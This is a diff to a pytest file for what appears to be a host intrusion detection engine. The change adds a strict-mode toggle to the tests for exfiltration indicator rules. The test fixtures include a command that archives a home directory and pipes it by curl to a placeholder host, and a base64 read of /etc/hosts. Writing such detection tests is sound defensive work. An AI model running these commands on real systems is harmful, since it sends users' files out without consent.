@@ -61,7 +61,7 @@ def harness(tmp_path,monkeypatch,request):
     runner.assert_not_called();store.close()
 
 
-def finding(store,rule_id,cmd,exe,*,age=0):
+def finding(store,rule_id,cmd,exe,*,age=0,strict=True):
     sensor=WorkerSysProc(store)
     raw={'processes':{PID:{'cmd':cmd,'exe':exe,'uid':1000,'ppid':200,'starttime_jiffies':1234}},
          'modules':[],'usb':[],'ports':[],'kernel_taint':0}
@@ -72,7 +72,8 @@ def finding(store,rule_id,cmd,exe,*,age=0):
     row=store.db.execute("SELECT id,body FROM records WHERE kind='normalized' ORDER BY id DESC LIMIT 1").fetchone()
     mapped=_smart_event(row[0],row[1])
     assert mapped['pid']==PID and mapped['starttime']==1234 and mapped['exe']==exe
-    matches=SmartRuleEngine().match(mapped)
+    engine=SmartRuleEngine();engine.strict_mode=strict
+    matches=engine.match(mapped)
     return next((f for f in matches if f['rule_id']==rule_id or rule_id in f.get('matched_rules',[])),None)
 
 
@@ -221,8 +222,9 @@ def test_ssh_explicit_two_source_policy_cannot_be_satisfied_by_one_indicator(har
     ('SATSUMA-EXFIL-008','base64 /etc/hosts','/usr/bin/base64'),
     ('SATSUMA-EXFIL-009','tar cf - /home/fixture | curl https://example.invalid/backup','/usr/bin/tar')])
 def test_base64_and_archive_indicators_do_not_authorize_single_event_termination(harness,rid,cmd,exe):
+    # 2.2.61: with the strictest mode off; in that mode (default) EXFIL-008/009 stop.
     store,state,worker,config=harness;state['exe']=exe
-    detected=finding(store,rid,cmd,exe);assert detected
+    detected=finding(store,rid,cmd,exe,strict=False);assert detected
     assert detected['classification']=='indicator' and detected['severity']=='medium'
     result=AutoActionEngine(store,config,response=worker).process(detected)['process_response']
     assert result['status']=='report_only' and not result['signal_sent'] and not state['signals']
